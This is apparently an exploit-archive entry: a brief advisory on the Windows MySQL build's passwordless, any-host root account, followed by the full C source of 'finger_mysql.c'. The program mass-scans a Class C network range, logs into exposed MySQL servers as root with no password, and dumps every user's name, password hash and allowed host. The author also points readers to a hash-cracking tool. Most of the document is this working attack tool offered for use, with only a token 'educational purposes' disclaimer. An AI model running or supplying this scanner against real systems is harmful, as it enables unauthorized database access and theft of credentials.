source: http://www.securityfocus.com/bid/5503/info
 
MySQL is is an open source relational database project, and is available for a number of operating systems, including Microsoft Windows.
 
A weak default configuration problem has been reported in the Windows binary release of MySQL. Reportedly, the root user of the database is defined with no password, and granted login privileges from any host.
 
This issue has been reported in the Windows binary release of MySQL. Other versions may share this default configuration, this has not however been confirmed.

/*
Program: finger_mysql.c
Original Date: October 5, 2002
Version 1.0
Platform: Linux (Compiled on SuSE 7.3 Pro)
c0der: st0ic
Web: www.fsix.net
email: st0ic@fsix.net

Revisions:
	NONE Thus Far

Compile:
	st0ic~# gcc -lpthread -lmysqlclient finger_mysql.c -o finger_mysql

Description:
This is a MySQL Class C IP scanner that finds vulnerable MySQL
daemons and attempts to login under the default root account with a
NULL password. After login, this program will dump the usernames,
encrypted password hash and the hostnames in the mysql.user table.

Other information:
The original idea for this came from mysqlfuck.c by g0th. I ran across
module's pscan.c code and decided it was elite... so I modified it to
work with this program. Those two pieces of code resulted in this piece
of code. See http://www.securiteam.com/securitynews/5GP0K0A81Y.html or
http://online.securityfocus.com/bid/5503 . Also, if you make too many
connects to the MySQL daemon without issuing any commands, depending on
the settings, you could be blocked. This program will make 1 bad connect
that will count against you, so be careful when using it. If you are blocked
the admin of the MySQL daemon will have to do a flush-hosts in order for you
to be able to connect again; See http://www.mysql.com/doc/en/Blocked_host.html
for more info. If your looking to test out how good the encrypted passwords are,
you can use this: http://www.securiteam.com/tools/5YP0H0A40O.html . If you
have problems with that, try to comment out the lines that contain this stuff:

printf("(%li)\t[0x%02x,0x%02x,0x%02x,0x%02x,0x%02x,0x%02x,0x%02x,0x%02x,0x%0
 2x,0x%02x]\t[%s]
 [%s]!=[%s]\n",attempts,hash[0],hash[1],hash[2],hash[3],hash[4],hash[5],hash[
 6],hash[7],hash[8],hash[9],temp,to,password);

That will probably get it to work without seg faulting.

Disclaimer:
Yeah, this is for educational purposes. I wrote this to test out your own MySQL
daemons and their passwords. Don't go trying it out on other people's
servers and try to be l33t.
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <mysql/mysql.h> /* might need to play with this */

#define MAXHOSTS 254
#define TIMEOUT 20 /* connection timeout in seconds */

/* mysql stuff */
#define db "mysql"
#define user "root"
#define pass NULL
#define query "SELECT user,password,host FROM user;"

/* add some color to you life */
/* ---> type <--- */
#define RESET           0
#define BRIGHT          1
#define DIM             2
#define UNDERLINE       3
#define BLINK           4
#define REVERSE         7
#define HIDDEN          8

/* ---> text color <-- */
#define BLACK           0
#define RED             1
#define GREEN           2
#define YELLOW          3
#define BLUE            4
#define MAGENTA         5
#define CYAN            6
#define WHITE           7
#define DEFAULT		8 /* not valid, so it reverts to default, hopefully. */

char hosts[MAXHOSTS][17];
int sockfd[MAXHOSTS];

struct c_info
{
	char *hostname;
	unsigned short int port;
};

void textcolor(int attr, int text, int bg);
void check_ip(char ip_tmp[]);
void parse_ip(char *ip);
void start_threads(char *ip, unsigned short int port);
void scan_host(struct c_info *);
void finger_mysql(char *hostname, unsigned short int port);

void textcolor(int attr, int text, int bg)
{       char command[13];

        /* Command is the control command to the terminal */
        sprintf(command, "%c[%d;%d;%dm", 0x1B, attr, text + 30, bg + 40);
        fprintf(stderr, "%s", command); /* lets color stderr! */
}

int main(int argc, char *argv[])
{
	char *ip, ip_tmp[32];
	unsigned short int port = 3306; /* mysql default port */
	
	setvbuf(stdout, NULL, _IONBF, 0);
	textcolor(BRIGHT, RED, BLACK);
	fprintf(stderr, "\n\t[   finger_mysql.c  ]");
	fprintf(stderr, "\n\t[      by st0ic     ]");
	fprintf(stderr, "\n\t[      Fsix.Net     ]");
	textcolor(BRIGHT, BLUE, BLACK);
	fprintf(stderr, "\n\n\t---> Don't Be Scer'ed!\n\n");
	textcolor(RESET, DEFAULT, DEFAULT);
	
	if (argc < 2 || argc > 3)
	{
		fprintf(stderr, "usage: %s <ip> [port]\n", argv[0]);
		fprintf(stderr, "\t ip\t Required. C Class IP to scan (ex. 10.219.1.).\n");
		fprintf(stderr, "\t port\t Optional. MySQL port to connect to (ex. 3306).\n");
		fprintf(stderr, "\t Examples: %s 192.168.1. 3306\n", argv[0]);
		fprintf(stderr, "\t           %s 192.168.1. > dump.txt\n\n", argv[0]);
		exit(1);
	}
	ip = argv[1];
	sprintf(ip_tmp, "%s", ip);
	if (argv[2] != NULL)
		port = ((unsigned short int)atoi(argv[2]));
	bzero(&sockfd, sizeof(sockfd));
	
	check_ip (ip_tmp);
	parse_ip (ip);
	start_threads(ip, port);
	
	return 0;
}

void check_ip (char ip_tmp[])
{
	char *split_ip;
	char *split_nums[3];
	int x, c;
	char *original_ip;
	
	original_ip = ip_tmp;
	
	split_ip = strtok(ip_tmp, ".");
	split_nums[0] = split_ip;
	split_ip = strtok(NULL, ".");
	split_nums[1] = split_ip;
	split_ip = strtok(NULL, ".");
	split_nums[2] = split_ip;
	
	for (x = 0; x < 3; x++)
	{
		c = atoi(split_nums[x]);
		if ((c > 255) || (c < 1))
		{
			fprintf(stderr, "\nSyntax error in IP range -- %s", ip_tmp);
			fprintf(stderr, "\n\tValid ranges are 1 - 254\n");
			exit(1);
		}
	}
}

void parse_ip (char *ip)
{
	int x;
	for (x = 0; x < 254; x++)
		sprintf(hosts[x], "%s%d", ip, x+1);
}

/* this is module's original function, almost unmodified */
void start_threads (char *ip, unsigned short int port)
{
	int i = 0, s, res, fd_amnt, j = 0;
	char buff[100];
	pthread_t p_thread[MAXHOSTS];
	struct c_info scanme[MAXHOSTS]; 
	
	bzero(scanme, sizeof(scanme)); 

	fprintf(stderr, "Beginning scan of %sx\n", ip);
	fprintf(stderr, "when you've had enough of the scanning, hit ^C (CONTROL+C)\n");
	fprintf(stderr, "Connection TIMEOUT = %d seconds\n", TIMEOUT);
	
	fd_amnt = (getdtablesize()-1);
	fprintf(stderr, "Using max file descriptors: %d\n\n", fd_amnt);
	
	for(i = 0; i < ((sizeof(hosts))/(sizeof(hosts[i]))); i++)       
	{
		for(s=0; s < fd_amnt && i < MAXHOSTS; s++,i++) 
		{
			scanme[i].port = port;
			scanme[i].hostname = hosts[i];   
			res = pthread_create(&p_thread[i],NULL,(void *)&scan_host,
				(struct c_info *)&scanme[i]);     
			
			if(res == EAGAIN)
			{
				printf("pthread_create: ran out of resources at %d iteration\n", i);
				exit(0);
			}
			usleep(1000);
		}
		
		/* wait for the deployed threads to return */
		sleep(1);
		for(s=0; s < fd_amnt && j < MAXHOSTS; s++, j++)
		{
			pthread_join(p_thread[j], NULL);
		}
	}                     
}
/* Another function written by module. I modified the shit outa it
in order to get it to work how I wanted it to :-). */
void scan_host (struct c_info *scanme)
{
	int *fd,i,l,c,err;
	fd_set wr;
	struct c_info *scanme_ptr;
	struct sockaddr_in sa;
	struct timeval tv;
  
	scanme_ptr = (struct c_info *) scanme;
	/* find a socket to use */
	for(i = 0;i < MAXHOSTS; i++)
	{
		if(!sockfd[i])
		{
			fd = &sockfd[i];
			break;
		 }
	}
    
	if((*fd = socket(AF_INET,SOCK_STREAM,IPPROTO_IP)) == (-1))
	{
		perror("\nsocket");
		exit(-1);
	}

	bzero(&sa, sizeof(sa));
	bzero(&tv, sizeof(tv));

	sa.sin_port   = htons(scanme_ptr->port);
	sa.sin_family = AF_INET;   
	tv.tv_sec     = TIMEOUT;
	tv.tv_usec    = 0;
   
	if(!inet_aton(scanme_ptr->hostname,&sa.sin_addr))
	{   
		fprintf(stderr,"inet_aton error\n");
		pthread_exit(0);
	}
    
	/* start non-blocking on socket */
	if((fcntl(*fd,F_SETFL,O_NONBLOCK))==(-1))
	{
		fprintf(stderr,"fcntl error\n");
		pthread_exit(0);
	}
	
	/* try to make an inital connection to the host */
	if((c = connect(*fd, (struct sockaddr *)&sa, sizeof(sa)))==(-1))
	{
		if(errno != EINPROGRESS)
		{
			close(*fd);
			/*printf("connect didnt have EINPROGRESS"); */
			pthread_exit(0);
		}
	}
	else if (c == 0)
	{
		printf("\t[%s]\tMySQLD running on port %d\n", 
			scanme_ptr->hostname, scanme_ptr->port);
		pthread_exit(0);
	}

	l = sizeof(err);
	
	/* check the socket for writing. */
	FD_SET(*fd,&wr);
	
	if((c=select(*fd+1,NULL,&wr,NULL, &tv))==(0))     
	{
		close(*fd);
		/*printf("select for wr on connect() timeout");*/
		pthread_exit(0);
	}
	else if(c == (-1)) /* redundant */
	{
		close(*fd);    /* for some generic select() error */
		/*printf("generic select error for connect() wr");*/
		pthread_exit(0);
	}
    
	/* use getsockopt() to see if we connected successfully */
	getsockopt(*fd,SOL_SOCKET,SO_ERROR,&err,&l);

	/* printf("sockopt: %d on %s\n",err,scanme_ptr->hostname);*/
   
	/* lets see what we have to work with now */
	if(err == ECONNREFUSED)
	{     
		close(*fd);                
		/*printf("connection refused at %s\n",scanme_ptr->hostname);*/
		pthread_exit(0);
	}
	else if(err == EHOSTUNREACH)
	{
		close(*fd);                              
		/*printf("host unreachable at %s",scanme_ptr->hostname);*/
		pthread_exit(0);
	}
	textcolor(BRIGHT, RED, BLACK);
	fprintf(stderr, "\t[%s]\tMySQLD running on port %d\n",
		scanme_ptr->hostname, scanme_ptr->port);
	textcolor(RESET, DEFAULT, DEFAULT);
	
	close(*fd);
	
	finger_mysql(scanme_ptr->hostname, scanme_ptr->port);
	
	pthread_exit(0);
}

void finger_mysql(char *hostname, unsigned short int port)
{
	MYSQL *conn;
	MYSQL_RES *result;
	MYSQL_ROW row;
	MYSQL_FIELD *field;
	unsigned int i, j, col_length;
	
	conn = mysql_init(NULL);
	if (conn == NULL)
	{
		printf("mysql_init() failed\n");
		pthread_exit(0);
	}
	if (mysql_real_connect(conn, hostname, user, pass, 
		db, port, NULL, 0) == NULL)
	{
		/*fprintf(stderr, "[%s] ERROR: mysql_real_connect error:\n\tError %u (%s)\n", 
			hostname, mysql_errno(conn), mysql_error(conn));*/
		pthread_exit(0);
	}
	textcolor(BRIGHT, BLUE, BLACK);
	fprintf(stderr, "\t---> [%s] Successful login\n", hostname);
	textcolor(RESET, DEFAULT, DEFAULT);
	if (mysql_query(conn, query) != 0)
	{
		/*fprintf(stderr, "[%s] ERROR: mysql_query() failed:\n\tError %u (%s)\n", 
			hostname, mysql_errno(conn), mysql_error(conn));*/
		mysql_close(conn);
		pthread_exit(0);
	}
	if ((result = mysql_store_result(conn)) == NULL)
	{
		/*fprintf(stderr, "[%s] ERROR: mysql_store_result() failed:\n\tError %u (%s)\n", 
			hostname, mysql_errno(conn), mysql_error(conn));*/
		mysql_close(conn);
		pthread_exit(0);
	}
	
	printf("USER | PASSWORD | HOST for %s:\n", hostname);
	
	/* attempt to print pretty output... not as good as the mysql client's though :-( */
	mysql_field_seek(result, 0);
	for (i = 0; i < mysql_num_fields(result); i++)
	{
		field = mysql_fetch_field(result);
		col_length = strlen(field->name);
		if (col_length < field->max_length)
			col_length = field->max_length;
		if (col_length < 4 && !IS_NOT_NULL (field->flags))
			col_length = 4; /* length of the word "NULL" */
		field->max_length = col_length;
	}
	mysql_field_seek (result,0);
	fputc ('+', stdout); /* header stuff */
	for (i = 0;i < mysql_num_fields(result);i++)
	{
		field = mysql_fetch_field (result);
		for (j = 0;j < field->max_length + 2;j++)
			fputc ('-', stdout);
		fputc ('+', stdout);
	}
	fputc ('\n', stdout); /* columns/rows for data */
	while ((row = mysql_fetch_row (result))!=NULL)
	{
		mysql_field_seek (result, 0);
		fputc ('|', stdout);
		for (i =0; i < mysql_num_fields(result);i++)
		{
			field = mysql_fetch_field (result);
			if (row [i] == NULL)
				printf (" %-*s |",field->max_length, NULL  );
			else if (IS_NUM (field->type))
				printf (" %*s |",field->max_length,row [i ]);
			else
				printf (" %-*s |",field->max_length,row [i ]);
		}
		fputc ('\n', stdout);
	}
	mysql_close(conn);
	free(conn);
}